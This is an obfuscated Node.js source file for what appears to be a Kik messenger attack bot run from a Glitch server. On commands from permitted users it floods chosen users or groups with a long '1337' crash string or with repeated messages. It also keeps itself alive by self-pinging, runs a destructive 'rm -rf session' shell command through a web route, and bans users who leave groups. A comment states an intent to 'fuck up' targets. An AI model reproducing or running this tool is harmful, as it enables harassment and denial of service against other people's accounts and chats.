let userinfo = ["user", "pass"]; //["username", "password"]

//Who we fucking up?? 👀

(async () => {
  let axios = require("axios");
  setInterval(async () => {
    await axios.get("https://quietlybot.glitch.me/");
    await axios.get("https://quietlybot.glitch.me/");
    await axios.get("https://quietlybot.glitch.me/");
    return;
  }, 120000);
})();

const _0x5aa0 = [
  "userjoinedgroup",
  "sendXmpp",
  "/morph.js",
  "child_process",
  "\x20attempted\x20to\x20send\x20the\x20following:",
  "endsWith",
  "port",
  "receivedjidinfo",
  "PRIVATE:\x20",
  "\x20https://quietlybot.glitch.me/\x20",
  "connect",
  "axios",
  "unescape",
  "log",
  "public",
  "env",
  "/morph",
  "jid",
  "sendFile",
  "\x20https://quietlybot.glitch.me/\x20",
  "Please\x20solve\x20captcha",
  "Send",
  "use",
  "static",
  "Okay\x20senpai\x20😳",
  "code",
  "receivedprivatemsg",
  "express",
  "forEach",
  "415600ZXdGju",
  "setGroupMember",
  "displayName",
  "privatetyping",
  "Xmpp",
  "error:\x20",
  "rm\x20-rf\x20session\x20&&\x20refresh",
  "send",
  "\x20loops\x20UwU,\x20I\x20like\x20when\x20you\x20make\x20me\x20do\x20such\x20naughty\x20things\x20sendpai.",
  "perm",
  "post",
  "split",
  ":\x20[",
  "all\x20done\x20sending\x20",
  ".kik.com",
  "747793hdFjRW",
  "stderr:\x20",
  "Fast",
  "address",
  "./src/permit",
  "/stanza",
  "Your\x20app\x20is\x20listening\x20on\x20port\x20",
  "500mb",
  "jids",
  "]:\x20",
  "grouptyping",
  "sendMessage",
  "slice",
  "1406880yaPvQH",
  "body",
  "addFriend",
  "\x20is\x20typing...",
  "listen",
  "Add",
  "\x20https://valuable-peat-dingo.glitch.me/\x20",
  "GROUP:",
  "961317AdbZqR",
  "1206339rWnTee",
  "\x20is\x20typing",
  "receivedcaptcha",
  "get",
  "\x20left\x20the\x20group",
  "1558959gpkNRr",
  "setBanned",
  "stdout:\x20",
  "./src/core",
  "receivedroster",
  "receivedgroupmsg",
  "Loop",
  "json",
  "108144NhHolA",
  "\x20stopped\x20typing"
];
const _0x2c1a = function(_0x1e5285, _0x1f618d) {
  _0x1e5285 = _0x1e5285 - 0x1bd;
  let _0x5aa0ef = _0x5aa0[_0x1e5285];
  return _0x5aa0ef;
};
const _0xbe07ef = _0x2c1a;
(function(_0x22d529, _0x43ec80) {
  const _0x8dc304 = _0x2c1a;
  while (!![]) {
    try {
      const _0x57259f =
        -parseInt(_0x8dc304(0x1bd)) +
        -parseInt(_0x8dc304(0x1cc)) +
        parseInt(_0x8dc304(0x1e2)) +
        parseInt(_0x8dc304(0x1d9)) +
        parseInt(_0x8dc304(0x1e1)) +
        -parseInt(_0x8dc304(0x1ef)) +
        -parseInt(_0x8dc304(0x1e7));
      if (_0x57259f === _0x43ec80) break;
      else _0x22d529["push"](_0x22d529["shift"]());
    } catch (_0x8ceb36) {
      _0x22d529["push"](_0x22d529["shift"]());
    }
  }
})(_0x5aa0, 0xb5a68);
const express = require(_0xbe07ef(0x20c)),
  app = express(),
  permit = require(_0xbe07ef(0x1d0))[_0xbe07ef(0x1c6)],
  accesJids = require(_0xbe07ef(0x1d0))[_0xbe07ef(0x1d4)],
  axios = require(_0xbe07ef(0x1fc)),
  { exec } = require(_0xbe07ef(0x1f4));
app["use"](
  express[_0xbe07ef(0x1ee)]({ limit: _0xbe07ef(0x1d3), extended: !![] })
),
  app[_0xbe07ef(0x207)](
    express["urlencoded"]({ limit: _0xbe07ef(0x1d3), extended: !![] })
  ),
  app["use"](express[_0xbe07ef(0x208)](_0xbe07ef(0x1ff))),
  app[_0xbe07ef(0x1e5)]("/", function(_0x19f627, _0x2a408a) {
    const _0x521511 = _0xbe07ef;
    _0x2a408a[_0x521511(0x203)](__dirname + "/views/index.html");
  }),
  app[_0xbe07ef(0x1e5)]("/reset", function(_0x45949a, _0x2076ef) {
    const _0x46d08c = _0xbe07ef;
    exec(_0x46d08c(0x1c3), (_0x4aaca0, _0x50d0d8, _0x276419) => {
      const _0x1766e7 = _0x46d08c;
      if (_0x4aaca0) {
        console[_0x1766e7(0x1fe)](_0x1766e7(0x1c2) + _0x4aaca0["message"]);
        return;
      }
      if (_0x276419) {
        console["log"](_0x1766e7(0x1cd) + _0x276419);
        return;
      }
      console[_0x1766e7(0x1fe)](_0x1766e7(0x1e9) + _0x50d0d8);
    });
  });
let Kik;
app[_0xbe07ef(0x1e5)](_0xbe07ef(0x201), function(_0x48dcf7, _0x1cb87b) {
  const _0x17ff01 = _0xbe07ef;
  _0x1cb87b["sendFile"](__dirname + _0x17ff01(0x1f3));
});
const KikClient = require(_0xbe07ef(0x1ea)),
  decode = require(_0xbe07ef(0x1fd));
Kik = new KikClient({
  username: userinfo[0x0],
  password: userinfo[0x1],
  promptCaptchas: !![],
  trackUserInfo: !![],
  trackFriendInfo: !![]
});
async function webXmpp(_0x22f52f, _0x5e1a3d, _0x2d4f10) {
  const _0x2ca9ba = _0xbe07ef;
  let _0x20cfc9 = 0x0;
  while (_0x20cfc9 <= _0x5e1a3d) {
    console[_0x2ca9ba(0x1fe)](_0x22f52f),
      Kik[_0x2ca9ba(0x1f2)](_0x2d4f10, _0x22f52f),
      await new Promise(_0xfff661 => setTimeout(_0xfff661, delay)),
      (_0x20cfc9 += 0x1);
  }
}
app[_0xbe07ef(0x1c7)](_0xbe07ef(0x1d1), function(_0x33b9c, _0x1c977d) {
  const _0x5ce70c = _0xbe07ef;
  console[_0x5ce70c(0x1fe)](_0x33b9c[_0x5ce70c(0x1da)]),
    _0x1c977d[_0x5ce70c(0x1c4)](""),
    webXmpp(
      _0x33b9c[_0x5ce70c(0x1da)][0x0],
      _0x33b9c[_0x5ce70c(0x1da)][0x1],
      _0x33b9c[_0x5ce70c(0x1da)][0x2]
    );
}),
  Kik["on"]("authenticated", () => {}),
  Kik["on"](_0xbe07ef(0x1eb), (_0x3696a8, _0x586e3b) => {
    const _0x538716 = _0xbe07ef;
    console["log"](_0x3696a8), console[_0x538716(0x1fe)](_0x586e3b);
  }),
  Kik["on"](_0xbe07ef(0x1e4), _0x39a4df => {
    const _0x4a62c4 = _0xbe07ef;
    console[_0x4a62c4(0x1fe)](_0x4a62c4(0x205) + _0x39a4df);
  }),
  Kik["on"](_0xbe07ef(0x1f8), _0x5043ea => {
    const _0xc9c59a = _0xbe07ef;
    console[_0xc9c59a(0x1fe)]("We\x20got\x20peer\x20info:"),
      console[_0xc9c59a(0x1fe)](_0x5043ea);
  }),
  Kik["on"](_0xbe07ef(0x1ec), (_0x1b0d69, _0x52c533, _0x1d62e2) => {
    const _0x402f5b = _0xbe07ef;
    console[_0x402f5b(0x1fe)](
      _0x402f5b(0x1e0) +
        _0x1b0d69[_0x402f5b(0x20a)] +
        _0x402f5b(0x1c9) +
        _0x52c533[_0x402f5b(0x1bf)] +
        _0x402f5b(0x1d5) +
        _0x1d62e2
    );
  }),
  Kik["on"](_0xbe07ef(0x1d6), (_0xa3ef2e, _0x5adfd3, _0x16c7d7) => {
    const _0x2c99dc = _0xbe07ef;
    _0x16c7d7
      ? console[_0x2c99dc(0x1fe)](
          _0x2c99dc(0x1e0) +
            _0xa3ef2e[_0x2c99dc(0x20a)] +
            ":\x20" +
            _0x5adfd3["displayName"] +
            _0x2c99dc(0x1dc)
        )
      : console[_0x2c99dc(0x1fe)](
          _0x2c99dc(0x1e0) +
            _0xa3ef2e["code"] +
            ":\x20" +
            _0x5adfd3[_0x2c99dc(0x1bf)] +
            _0x2c99dc(0x1f0)
        );
  }),
  Kik["on"]("userleftgroup", (_0x9246d, _0x35d432, _0x282e2b) => {
    const _0x11a319 = _0xbe07ef;
    console[_0x11a319(0x1fe)](
      "GROUP:" +
        _0x9246d[_0x11a319(0x20a)] +
        ":\x20" +
        _0x35d432[_0x11a319(0x1bf)] +
        _0x11a319(0x1e6)
    ),
      Kik[_0x11a319(0x1e8)](_0x9246d["jid"], _0x35d432[_0x11a319(0x202)], !![]);
  }),
  Kik["on"](_0xbe07ef(0x1f1), (_0xa4b04f, _0x50c5fc, _0x5ab8de) => {
    const _0x593bdf = _0xbe07ef;
    console["log"](
      "GROUP:" +
        _0xa4b04f[_0x593bdf(0x20a)] +
        ":\x20" +
        _0x50c5fc[_0x593bdf(0x1bf)] +
        "\x20joined\x20the\x20group"
    ),
      Kik[_0x593bdf(0x1be)](_0xa4b04f["jid"], _0x50c5fc[_0x593bdf(0x202)], ![]);
  });
let lag1 =
    "133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713++l",
  delay = 0x190;
Kik["on"](_0xbe07ef(0x20b), async (_0x3c04cf, _0xd720dd) => {
  const _0x2c5ec9 = _0xbe07ef;
  if (permit(_0x3c04cf["jid"])) {
    let _0x55ab5d = _0xd720dd[_0x2c5ec9(0x1c8)]("\x20"),
      _0x4cbfd6 = _0xd720dd["split"]("\x0a");
    if (_0x55ab5d[0x0] == _0x2c5ec9(0x1de) && _0x55ab5d[0x1] == "me") {
      let _0x56ba56 =
        "I\x27ve\x20always\x20wanted\x20a\x20BFF,\x20you\x20can\x20add\x20me\x20to\x20groups\x20now";
      await Kik[_0x2c5ec9(0x1db)](_0x3c04cf[_0x2c5ec9(0x202)]),
        await Kik[_0x2c5ec9(0x1db)](_0x3c04cf[_0x2c5ec9(0x202)]),
        await Kik[_0x2c5ec9(0x1db)](_0x3c04cf[_0x2c5ec9(0x202)]),
        await Kik["sendMessage"](_0x3c04cf[_0x2c5ec9(0x202)], _0x56ba56);
      return;
    }
    if (_0x55ab5d[0x0] == _0x2c5ec9(0x206) && _0x55ab5d[0x1] == "link") {
      let _0x33e8a2 = [_0x2c5ec9(0x1df), _0x2c5ec9(0x1fa), _0x2c5ec9(0x204)];
      await Kik[_0x2c5ec9(0x1d7)](_0x3c04cf[_0x2c5ec9(0x202)], _0x33e8a2[0x2]);
      return;
    }
    await Kik["sendMessage"](_0x3c04cf[_0x2c5ec9(0x202)], _0x2c5ec9(0x209));
    if (_0x55ab5d[0x0] == _0x2c5ec9(0x1c1)) {
      (async () => {
        const _0x3c5b4f = _0x2c5ec9;
        let _0xdb8e65 = 0x0;
        while (_0xdb8e65 <= parseInt(_0x55ab5d[0x2])) {
          Kik[_0x3c5b4f(0x1f2)](_0x55ab5d[0x1], decode(_0x4cbfd6[0x1])),
            await new Promise(_0x58d76f => setTimeout(_0x58d76f, delay)),
            (_0xdb8e65 += 0x1);
        }
        let _0x233907 = _0x3c5b4f(0x1ca) + _0x55ab5d[0x2] + _0x3c5b4f(0x1c5);
        await Kik[_0x3c5b4f(0x1d7)](_0x3c04cf["jid"], _0x233907);
      })();
      return;
    }
    if (
      _0x55ab5d[0x0] == _0x2c5ec9(0x1ed) &&
      _0x55ab5d[0x1][_0x2c5ec9(0x1f6)](_0x2c5ec9(0x1cb))
    ) {
      (async () => {
        const _0x5a01c7 = _0x2c5ec9;
        Kik["sendMessage"]("", _0xd720dd);
        let _0x215be3 = 0x0;
        while (_0x215be3 <= _0x55ab5d[0x2]) {
          await Kik[_0x5a01c7(0x1d7)](_0x55ab5d[0x1], lag1),
            await new Promise(_0x34c672 => setTimeout(_0x34c672, delay)),
            (_0x215be3 += 0x1);
        }
        let _0x53d636 = _0x5a01c7(0x1ca) + _0x55ab5d[0x2] + _0x5a01c7(0x1c5);
        await Kik["sendMessage"](_0x3c04cf[_0x5a01c7(0x202)], _0x53d636);
      })();
      return;
    }
    if (
      _0x55ab5d[0x0] == _0x2c5ec9(0x1ce) &&
      _0x55ab5d[0x1][_0x2c5ec9(0x1f6)](_0x2c5ec9(0x1cb))
    ) {
      (async () => {
        const _0x4f6db9 = _0x2c5ec9;
        Kik[_0x4f6db9(0x1d7)]("", _0xd720dd);
        let _0x162691 = 0x0;
        while (_0x162691 <= _0x55ab5d[0x2]) {
          await Kik[_0x4f6db9(0x1d7)](_0x55ab5d[0x1], lag1),
            await new Promise(_0x1ed301 => setTimeout(_0x1ed301, 0x37)),
            (_0x162691 += 0x1);
        }
        let _0x409683 =
          "all\x20done\x20sending\x20" +
          _0x55ab5d[0x2] +
          "\x20loops\x20UwU,\x20I\x20like\x20when\x20you\x20make\x20me\x20do\x20such\x20naughty\x20things\x20sendpai.";
        await Kik[_0x4f6db9(0x1d7)](_0x3c04cf["jid"], _0x409683);
      })();
      return;
    }
  } else
    permit(_0x3c04cf[_0x2c5ec9(0x202)]) == ![] &&
      accesJids[_0x2c5ec9(0x20d)](_0x5d5458 => {
        const _0x12b9d9 = _0x2c5ec9;
        let _0x2f617a = _0x3c04cf[_0x12b9d9(0x202)][_0x12b9d9(0x1d8)](
          0x0,
          -0x11
        );
        Kik[_0x12b9d9(0x1d7)](_0x5d5458, "@" + _0x2f617a + _0x12b9d9(0x1f5)),
          Kik[_0x12b9d9(0x1d7)](_0x5d5458, decode(_0xd720dd));
      });
}),
  Kik["on"](_0xbe07ef(0x1c0), (_0x76c083, _0xc0a4e9) => {
    const _0x2b5a32 = _0xbe07ef;
    _0xc0a4e9
      ? console[_0x2b5a32(0x1fe)](
          _0x2b5a32(0x1f9) + _0x76c083[_0x2b5a32(0x202)] + _0x2b5a32(0x1e3)
        )
      : console[_0x2b5a32(0x1fe)](
          "PRIVATE:\x20" + _0x76c083[_0x2b5a32(0x202)] + _0x2b5a32(0x1f0)
        );
  });
const listener = app[_0xbe07ef(0x1dd)](
  process[_0xbe07ef(0x200)]["PORT"],
  function() {
    const _0xc65bce = _0xbe07ef;
    Kik[_0xc65bce(0x1fb)](),
      console[_0xc65bce(0x1fe)](
        _0xc65bce(0x1d2) + listener[_0xc65bce(0x1cf)]()[_0xc65bce(0x1f7)]
      );
  }
);
